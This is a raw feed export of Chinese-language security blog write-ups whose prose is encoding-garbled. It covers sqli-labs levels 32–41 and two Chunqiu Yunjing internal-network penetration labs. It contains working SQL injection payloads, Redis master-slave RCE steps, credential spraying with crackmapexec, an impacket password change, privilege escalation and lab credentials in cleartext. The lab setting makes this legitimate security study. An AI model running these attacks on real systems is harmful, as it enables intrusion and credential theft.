title="Less-32"></a>Less-32</h2><p>é¦–å…ˆæ­£å¸¸çš„å»æµ‹è¯•å‘ç°å¼•å·è¢«è½¬ä¹‰äº†ï¼Œåƒè¿™ç§è¢«è½¬ä¹‰å¤šåŠæ˜¯addslashes()ï¼Œå…³äºè¿™ä¸ªå‡½æ•°çš„ç»•è¿‡å°±æœ‰ï¼šç¼–ç ç»•è¿‡å’Œå®½å­—èŠ‚æ³¨å…¥ï¼Œä½†æ˜¯è¿™é‡Œåº”è¯¥æ²¡æœ‰è§£ç å‡½æ•°æ‰€ä»¥åªèƒ½è€ƒè™‘ï¼Œå®½å­—èŠ‚æ³¨å…¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES gbkç¼–ç ä¸ºGBKç¼–ç æ—¶å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥</span><br><span class="line">å•å­—èŠ‚ï¼šæ¯ä¸ªå­—ç¬¦åªç”±ä¸€ä¸ªå­—èŠ‚ç»„æˆï¼Ÿè€Œä¸€ä¸ªå­—èŠ‚8ä¸ªbitä¹Ÿå°±æ„å‘³ç€å•å­—èŠ‚å­—ç¬¦åªæœ‰2<span class="built_in">^</span>8=256ä¸ªå­—ç¬¦,ä¹Ÿå°±æ˜¯asciiï¼š0-255</span><br><span class="line">å®½å­—èŠ‚ï¼šæ¯”å¦‚Unicodeæ˜¯ä¸€ç§æ‰€æœ‰çš„å­—ç¬¦éƒ½ä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚ç¼–ç çš„ç¼–ç æ¨¡å¼ã€‚å­˜å‚¨ï¼š2ä¸ªå­—èŠ‚å­˜å‚¨ã€‚</span><br><span class="line">åŸç†ï¼šä¸ºä»€ä¹ˆè¯´gbkç¼–ç å‘¢ï¼Ÿ</span><br><span class="line">å› ä¸ºåæ–œæ çš„ç¼–ç ä¸º<span class="comment">%5cï¼Œè€Œåœ¨GBKç¼–ç ä¸­ï¼Œ%df%5cæ˜¯ç¹ä½“å­—â€œé€£â€</span></span><br><span class="line">æ‰€ä»¥å¯ä»¥é€šè¿‡1<span class="comment">%df&#x27;ç»è¿‡addslashes()å‡½æ•°å°±æ˜¯ï¼š1é€£&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´å¾—æ˜¯GBKç¼–ç </p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="comment">%df&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata%23</span></span><br></pre></td></tr></table></figure><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>å’Œä¸Šä¸€å…³ä¸€æ ·</p><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>ç™»å½•æ¡†ï¼Œå¼•å·è¢«è½¬ä¹‰äº†ï¼Œå°è¯•äº†å®½å­—èŠ‚å¤±è´¥äº†ï¼Œäºæ˜¯è½¬å‘å¼±å£ä»¤ï¼Œä½†æ˜¯å¼±å£ä»¤ç™»å½•è¿›å»å•¥ä¹Ÿæ²¡æœ‰ï¼Œæœæ–­çœ‹wpï¼Œå‘ç°æ˜¯postå¯¹%dfè¿›è¡Œäº†urlç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠ“åŒ…è¿›è¡Œæ³¨å…¥</p><p><img src="/../images/achieve/2025/12/image-20251230150031974.png" alt="image-20251230150031974"></p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>å—åˆ°å‰å‡ å…³çš„å½±å“ï¼Œè¿˜ä»¥ä¸ºåˆæ˜¯å­—ç¬¦å‹ï¼Œå¼•å·ç»•è¿‡ä¸äº†ï¼Œæ²¡æƒ³åˆ°æ˜¯æ•°å­—å‹ï¼Œç„¶ååé¢å¼•å·æ²¡äº†çš„è¯ç”¨16è¿›åˆ¶å°±å¥½äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1000 union select 1,2,group<span class="built_in">_</span>concat(column<span class="built_in">_</span>name) from information<span class="built_in">_</span>schema.columns where table<span class="built_in">_</span>schema=database() and table<span class="built_in">_</span>name=0x7573657273--+</span><br></pre></td></tr></table></figure><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>å­—ç¬¦å‹ç„¶åå¼•å·è¢«è½¬ä¹‰ï¼Œå®½å­—èŠ‚æ³¨å…¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=000<span class="comment">%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>post</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=ad<span class="comment">%df&#x27;%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%23&amp;passwd=fasdf&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h2 id="Less-38-å †å æ³¨å…¥"><a href="#Less-38-å †å æ³¨å…¥" class="headerlink" title="Less-38(å †å æ³¨å…¥)"></a>Less-38(å †å æ³¨å…¥)</h2><p>æ­£å¸¸æ‰“ä¹Ÿè¡Œï¼Œä½†æ˜¯è¿™é¢˜æœ¬æ„è€ƒå †å ï¼Œphpä¸­<code>mysqli_multi_query()</code>å‡½æ•°å¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;select(sleep(5))<span class="comment">%23</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåé¢çš„sleep(5)å¹¶æ²¡æœ‰æ‰§è¡Œï¼Œè¿™æ˜¯å› ä¸ºåç«¯è¯­å¥æ²¡æœ‰å¤„ç†ç¬¬äºŒä¸ªç»“æœï¼Œå¯ä»¥ç®€å•çš„ç†è§£æˆæ‰§è¡Œå®Œç¬¬ä¸€ä¸ªè¯­å¥å°±ç›´æ¥æ‹¿ç»“æœè¿”å›äº†ï¼Œè™½ç„¶ç¬¬äºŒä¸ªè¯­å¥ä¹Ÿä¼šæ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ç°åœ¨ç¬¬äºŒä¸ªè¯­å¥ä¸ä¼šå½±å“é¡µé¢çš„å›æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥å †å å†™å…¥webshell</p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>æ•°å­—å‹çš„å †å æ³¨å…¥</p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>é—­åˆæ–¹å¼ä¸ºâ€™)çš„å †å </p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æœ‰é¸¡è‚‹ï¼Œä½ å¾—çŸ¥é“å½“å‰çš„è¡¨å</span><br><span class="line">çˆ†åº“ï¼š0&#x27;);update users set password=(select database()) where id=1--+</span><br><span class="line">.....åé¢ç±»ä¼¼</span><br></pre></td></tr></table></figure><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2>]]></content>
      
      
      <categories>
          
          <category> sqlæ³¨å…¥ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘é•œBrute4Road</title>
      <link href="/2025/12/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBrute4Road/"/>
      <url>/2025/12/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBrute4Road/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h2><p>çœ‹äº†ä¸€ä¸‹tpçš„å›¾æ ‡æ‰«äº†ä¸€ä¸‹æ²¡å‘ç°ndayï¼Œé‚£ä¹ˆç”¨fscanæ‰«æä¸€ä¸‹</p><p><img src="/../images/achieve/2025/12/image-20251220202622563.png" alt="image-20251220202622563"></p><p>å­˜åœ¨redisæœªæˆæƒè®¿é—®ï¼Œå‚è€ƒ<a href="https://www.freebuf.com/articles/web/452309.html">Redisæœªæˆæƒè®¿é—®è¯¦è§£â€”â€”æ–°æ‰‹å‹å¥½ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>å†™æ–‡ä»¶éƒ½ç”¨ä¸äº†æ²¡æœ‰æƒé™æˆ‘éƒ½è¯•äº†ï¼Œå†å‚è€ƒ<a href="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/">Redisæœªæˆæƒåˆ©ç”¨</a></p><p>åªè¦æœªæˆæƒè®¿é—®+æœªç¦ç”¨<code>SLAVEOF</code>å°±å¯ä»¥æ‰“ä¸»ä»å¤åˆ¶RCE</p><p>åœ¨ Redis æç¤ºç¬¦ä¸‹è¾“å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SLAVEOF</span><br></pre></td></tr></table></figure><ul><li><strong>è¢«ç¦ç”¨çš„è¡¨ç°</strong>ï¼šè¿”å› <code>(error) ERR unknown command &#39;SLAVEOF&#39;</code> æˆ– <code>(error) ERR unknown command &#39;replicaof&#39;</code>ã€‚è¿™è¯´æ˜ç®¡ç†å‘˜åœ¨ <code>redis.conf</code> ä¸­ä½¿ç”¨äº† <code>rename-command</code> å°†å…¶é‡å‘½åæˆ–åˆ é™¤äº†ã€‚</li><li><strong>æœªç¦ç”¨çš„è¡¨ç°</strong>ï¼šè¿”å› <code>(error) ERR wrong number of arguments for &#39;slaveof&#39; command</code>ã€‚è¿™è¯´æ˜å‘½ä»¤å­˜åœ¨ï¼Œåªæ˜¯ä½ æ²¡ç»™å‚æ•°ã€‚</li></ul><p><img src="/../images/achieve/2025/12/image-20251220202943380.png" alt="image-20251220202943380"></p><p>æ‰€ä»¥æ˜¯å¯ä»¥æ‰“ä¸»ä»å¤åˆ¶RCE</p><p>ä¸€é”®åˆ©ç”¨çš„å·¥å…· <a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p><img src="/../images/achieve/2025/12/image-20251220205005436.png" alt="image-20251220205005436"></p><p>ç¯å¢ƒå®¹æ˜“æ‰“å´©ä¸€å´©å°±è¦é‡å¼€ç¯å¢ƒï¼Œæ‰€ä»¥äº‰å–ä¸€æ¬¡æ€§æ‰“é€šï¼Œåå¼¹shellé»˜è®¤çš„æ˜¯sh</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªå‘½ä»¤èµ·ä¸€ä¸ªbashï¼Œctrl+cç›´æ¥åˆç»™æˆ‘é€€å‡ºshelläº†ï¼Œç®—äº†æ˜å¤©å†æ‰“ï¼Œæ²¡æƒé™suidææƒ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>base64ææƒï¼Œæ‹¿ä¸‹ç¬¬ä¸€ä¸ªflag</p><p><img src="/../images/achieve/2025/12/image-20251221133553861.png" alt="image-20251221133553861"></p><h2 id="å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>å†…ç½‘ä¿¡æ¯æ”¶é›†</h2><p>wgetè‡ªå·±vpsä¸Šçš„fscanè¿˜æœ‰linux_x64_agentï¼Œipconfigç”¨ä¸äº†ï¼Œå¯ä»¥ç”¨hostname -I</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">(icmp) Target 172.22.2.18     is alive</span><br><span class="line">(icmp) Target 172.22.2.3      is alive</span><br><span class="line">(icmp) Target 172.22.2.7      is alive</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">172.22.2.16:139 open</span><br><span class="line">172.22.2.3:139 open</span><br><span class="line">172.22.2.18:139 open</span><br><span class="line">172.22.2.18:80 open</span><br><span class="line">172.22.2.34:139 open</span><br><span class="line">172.22.2.16:135 open</span><br><span class="line">172.22.2.3:135 open</span><br><span class="line">172.22.2.7:80 open</span><br><span class="line">172.22.2.34:135 open</span><br><span class="line">172.22.2.18:22 open</span><br><span class="line">172.22.2.7:22 open</span><br><span class="line">172.22.2.16:80 open</span><br><span class="line">172.22.2.7:21 open</span><br><span class="line">172.22.2.3:88 open</span><br><span class="line">172.22.2.7:6379 open</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">[*] alive ports len is: 20</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.3</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]172.22.2.3</span><br><span class="line">[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.16</span><br><span class="line">   [-&gt;]MSSQLSERVER</span><br><span class="line">   [-&gt;]172.22.2.16</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.34</span><br><span class="line">   [-&gt;]CLIENT01</span><br><span class="line">   [-&gt;]172.22.2.34</span><br><span class="line">[*] NetBios 172.22.2.34     XIAORANG<span class="keyword">\CLIENT</span>01             </span><br><span class="line">[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] OsInfo 172.22.2.3(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.2.16(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.2.18     WORKGROUP<span class="keyword">\UBUNTU</span>-WEB02        </span><br><span class="line">[+] ftp 172.22.2.7:21:anonymous </span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[*] WebTitle http://172.22.2.18        code:200 len:57738  title:åˆä¸€ä¸ªWordPressç«™ç‚¹</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">(icmp) Target 172.22.2.18    åˆä¸€ä¸ªWordPressç«™ç‚¹</span><br><span class="line">(icmp) Target 172.22.2.3      DC</span><br><span class="line">(icmp) Target 172.22.2.7      å·²ç»æ‹¿ä¸‹</span><br><span class="line">(icmp) Target 172.22.2.16    MSSQLSERVER</span><br></pre></td></tr></table></figure><p>æ€»çš„æ¥è¯´å°±æ˜¯æ²¡æœ‰æ‰«å‡ºndayï¼Œä½†æ˜¯æœ‰ä¸ªwpçš„ç«™ç‚¹ï¼Œç”¨wpscanå»æ‰«æä¸€ä¸‹</p><p><img src="/../images/achieve/2025/12/image-20251221143015915.png" alt="image-20251221143015915"></p><h2 id="å†…ç½‘æ‰“ç‚¹"><a href="#å†…ç½‘æ‰“ç‚¹" class="headerlink" title="å†…ç½‘æ‰“ç‚¹"></a>å†…ç½‘æ‰“ç‚¹</h2><p>æ’ä»¶å­˜åœ¨ndayï¼Œå·¥å…·ä¸€æŠŠé”<a href="https://github.com/biulove0x/CVE-2021-25003">biulove0x&#x2F;CVE-2021-25003: WPCargo &lt; 6.9.0 - Unauthenticated RCE</a></p><p>ç„¶åèšå‰‘è¿æ¥&#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.phpå­˜åœ¨æ•°æ®åº“ä¿¡æ¯æ³„éœ²ï¼Œç»§ç»­è¿æ¥æ•°æ®åº“</p><p><img src="/../images/achieve/2025/12/image-20251221143200759.png" alt="image-20251221143200759"></p><p>æ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><p><img src="/../images/achieve/2025/12/image-20251221143432376.png" alt="image-20251221143432376"></p><p>æœ‰ä¸€å †å¯†ç ï¼Œæ‹¿æ¥æ¨ªå‘è¯•ä¸€è¯•ï¼Œå”¯ä¸€èƒ½æƒ³åˆ°çš„å¯èƒ½å°±æ˜¯<code>172.22.2.16 MSSQLSERVER</code>è¿™ä¸ªçš„çˆ†ç ´äº†<a href="https://github.com/shack2/SNETCracker/releases">https://github.com/shack2/SNETCracker/releases</a></p><p>ç„¶åç”¨MDUTè¿æ¥ä¸€ä¸‹å•Šï¼Œç”œåœŸè±†ææƒï¼Œæ‹¿åˆ°ç¬¬ä¸‰ä¸ªflag</p><p><img src="/../images/achieve/2025/12/image-20251221145122081.png" alt="image-20251221145122081"></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘é•œTsclient</title>
      <link href="/2025/12/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/"/>
      <url>/2025/12/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h2><p>fscanæ¼æ‰«ä¸€ä¸‹</p><p><img src="/../images/achieve/2025/12/image-20251216231654859.png" alt="image-20251216231654859"></p><p>MDUTæ•°æ®åº“è¿æ¥å·¥å…·è¿æ¥ä¸€ä¸‹ï¼Œæ²¡æƒé™ï¼Œä¸Šä¼ ä¸€ä¸ªç”œåœŸè±†ææƒ</p><p><img src="/../images/achieve/2025/12/image-20251217102350753.png" alt="image-20251217102350753"></p><h2 id="å†…ç½‘æ‰“ç‚¹"><a href="#å†…ç½‘æ‰“ç‚¹" class="headerlink" title="å†…ç½‘æ‰“ç‚¹"></a>å†…ç½‘æ‰“ç‚¹</h2><p>æç¤ºç”¨æˆ·ä¼šè¯ï¼Œå…ˆä¸Šçº¿cs</p><p><code>shell query user || qwinsta</code></p><p>æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</p><p><img src="/../images/achieve/2025/12/image-20251216233252828.png" alt="image-20251216233252828"></p><p>å°è¯•è¿›ç¨‹æ³¨å…¥ï¼ŒæˆåŠŸè·å–ï¼Œ<code>net use</code>æŸ¥çœ‹å…±äº«</p><p><img src="/../images/achieve/2025/12/image-20251216233823396.png" alt="image-20251216233823396"></p><p>ä¸‹é¢æœ‰ä¸ªå‡­è¯</p><p><img src="/../images/achieve/2025/12/image-20251216233901612.png" alt="image-20251216233901612"></p><p>å¼€å§‹æ”¶é›†å†…ç½‘ä¿¡æ¯ï¼Œä¸Šä¼ fscan</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.8.18     is alive</span><br><span class="line">(icmp) Target 172.22.8.15     is alive</span><br><span class="line">(icmp) Target 172.22.8.31     is alive</span><br><span class="line">(icmp) Target 172.22.8.46     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line"></span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">   [-&gt;]2001:0:348b:fb58:83f:175d:d89d:9280</span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line"></span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG<span class="keyword">\WIN</span>19-CLIENT         </span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG<span class="keyword">\DC</span>01           </span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 172.22.8.15 åŸŸæ§</span><br><span class="line">2. 172.22.8.31 åŸŸå†…æœºå™¨</span><br><span class="line">3. 172.22.8.18 å·²æ‹¿ä¸‹</span><br><span class="line">4. 172.22.8.46 åŸŸå†…æœºå™¨</span><br></pre></td></tr></table></figure><p>åŒæ—¶æ­å»ºå¥½éš§é“å¼€å§‹æ‰“å†…ç½‘ï¼Œæ‹¿åˆšåˆšçš„è´¦å·å¯†ç å»è¿›è¡ŒæŒ¨ä¸ªå°è¯•ï¼Œåˆ©ç”¨kaliä¸Šé¢çš„å·¥å…·</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€<span class="params">#</span> proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!<span class="params">#</span>&#x27;</span><br><span class="line">SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.18     445    WIN-WEB          [-] WIN-WEB<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>LOGON<span class="built_in">_</span>FAILURE </span><br><span class="line">SMB         172.22.8.46     445    WIN2016          [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.15     445    DC01             [-] xiaorang.lab<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>PASSWORD<span class="built_in">_</span>EXPIRED </span><br><span class="line">SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>PASSWORD<span class="built_in">_</span>EXPIRED </span><br><span class="line">SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>PASSWORD<span class="built_in">_</span>EXPIRED </span><br></pre></td></tr></table></figure><p>æœ‰äº›å¯†ç è¿‡æœŸäº†ï¼Œæ²¡å…³ç³»ç›´æ¥æ”¹å¯†ç å³å¯</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-changepasswd xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!<span class="params">#</span>&#x27;@172.22.8.15 -newpass &#x27;Admin@666&#x27;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åªæœ‰172.22.8.46è¿™ä¸ªå¯ä»¥ç™»å½•</p><p><img src="/../images/achieve/2025/12/image-20251217100612264.png" alt="image-20251217100612264"></p><p>å‰é¢æç¤ºäº†é•œåƒåŠ«æŒï¼Œçœ‹çœ‹æ³¨å†Œè¡¨æƒé™</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -path &quot;HKLM:<span class="keyword">\SOFTWARE</span><span class="keyword">\Microsoft</span><span class="keyword">\Windows</span> NT<span class="keyword">\CurrentVersion</span><span class="keyword">\Image</span> File Execution Options&quot; | fl *</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20251217100829220.png" 